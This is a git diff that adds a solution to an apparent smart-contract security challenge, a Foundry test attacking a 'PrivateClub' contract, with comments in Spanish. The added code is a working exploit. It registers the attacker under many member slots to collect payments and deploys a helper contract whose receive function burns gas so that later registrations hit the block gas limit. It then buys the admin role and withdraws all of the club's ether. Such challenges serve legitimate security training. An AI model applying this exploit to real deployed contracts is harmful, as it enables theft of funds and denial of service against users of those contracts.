@@ -46,6 +46,19 @@ contract Hack is Test {
         // block future registrations (reason: out of gas - block gas limit)
         // solution:
 
+        // Nos hacemos miembros del club, reenviando los ingresos a nosotros mismos
+        uint256 membersCount = club.membersCount();
+        address[] memory mForHacker = new address[](membersCount);
+        for (uint i = 0; i < membersCount; i++) {
+            mForHacker[i] = hacker;
+        }
+        club.becomeMember{value: membersCount * 1 ether}(mForHacker);
+
+        // Hacemos miembro del club al contrato que hará el gas limit
+        GasLimiter gasLimiter = new GasLimiter();
+        membersCount = club.membersCount();
+        gasLimiter.becomeMember{value: membersCount * 1 ether}(address(club));
+
         vm.stopPrank();
         // check - hacker is member
         assertTrue(club.members(hacker));
@@ -70,9 +83,42 @@ contract Hack is Test {
         // task2: buy admin role and withdraw all ether from the club
         // solution:
 
+        // Compramos el owner y retiramos los fondos
+        club.buyAdminRole{value: 10 ether}(hacker);
+        club.adminWithdraw(hacker, address(club).balance);
 
         // check - hacker is owner of club
         assertEq(club.owner(), hacker);
         assertGt(hacker.balance, 110000000000000000000 - 1);
+    }
+}
+
+/*
+* Contrato auxiliar que haremos miembro del club, para que cuando reciba los fondos del siguiente usuario provoque un gasto extra de gas
+*/
+contract GasLimiter {
+    uint256 blockGasLimit = 120000;
+    uint256 gasleftEnd;
+    address hacker = msg.sender;
+
+    function becomeMember(address _club) public payable {
+        PrivateClub club = PrivateClub(payable(_club));
+        uint256 membersCount = club.membersCount();
+        address[] memory mForHacker = new address[](membersCount);
+        for (uint i = 0; i < membersCount; i++) {
+            mForHacker[i] = hacker;
+        }
+        club.becomeMember{value: membersCount * 1 ether}(mForHacker);
+    }
+
+    /*
+    * Provoca un gasto extra de gas al recibir fondos
+    */
+    receive() external payable {
+        uint256 gasleftStart = gasleft();
+        gasleftEnd = gasleft();
+        while(gasleftStart - gasleftEnd < blockGasLimit) {
+            gasleftEnd = gasleft();
+        }
     }
 }
